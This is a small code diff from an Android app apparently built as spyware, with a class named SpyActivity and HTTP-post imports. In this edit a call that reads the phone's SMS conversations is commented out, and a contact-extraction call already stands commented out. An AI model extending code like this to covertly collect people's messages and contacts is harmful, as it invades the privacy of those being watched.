@@ -18,7 +18,12 @@ import org.apache.http.client.methods.HttpPost;
 import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.message.BasicNameValuePair;
 
-import contactsinformations.Contact;
+import com.example.spyapp.R;
+import com.example.spyapp.R.id;
+import com.example.spyapp.R.layout;
+import com.example.spyapp.R.menu;
+
+
 
 import android.app.Activity;
 import android.os.Bundle;
@@ -36,8 +41,9 @@ public class SpyActivity extends Activity {
 		setContentView(R.layout.activity_main);
 		
 		//print sms conversations
-		(new GetSMS()).getConversations(this);
+		//(new GetSMS()).getConversations(this);
 		//(new Contact()).CreateListContactFromPhone(this);
+	
 		Button sendButton = (Button) findViewById(R.id.button1);
 		final SpyActivity zis = this;
 		sendButton.setOnClickListener(new View.OnClickListener() {
